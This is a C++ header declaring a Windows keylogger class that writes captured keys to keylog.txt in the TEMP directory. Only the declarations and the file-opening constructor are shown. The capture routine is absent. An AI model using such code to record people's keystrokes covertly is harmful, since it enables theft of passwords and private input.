#ifndef KEYLOG_H
#define KEYLOG_H

#include <Windows.h>
#include <mutex>
#include <spdlog/spdlog.h>
#include <string>


class KeyLogger {
private:
  std::mutex logMutex;
  bool running;
  FILE *logFile;

  // Convert virtual key code to readable character
  std::string GetKeyName(int vkCode, bool shiftPressed, bool capsLock);

public:
  KeyLogger() : running(true), logFile(nullptr) {
    // Initialize file logging and put the file in the temp directory
    const char* tempPath = getenv("TEMP");
    if (tempPath) {
        std::string filePath = std::string(tempPath) + "\\keylog.txt";
        logFile = fopen(filePath.c_str(), "w");
    } else {
        spdlog::error("Failed to get TEMP environment variable");
    }
    
    if (!logFile) {
      spdlog::error("Failed to open log file");
    }

    if (logFile) {
      spdlog::info("Keylogger started");
    } else {
      spdlog::error("Keylogger failed to start");
    }
  }

  ~KeyLogger() {
    if (logFile) {
      fclose(logFile);
    }
  }

  void StartLogging();

  void Stop() { running = false; }
};

#endif /* KEYLOG_H */
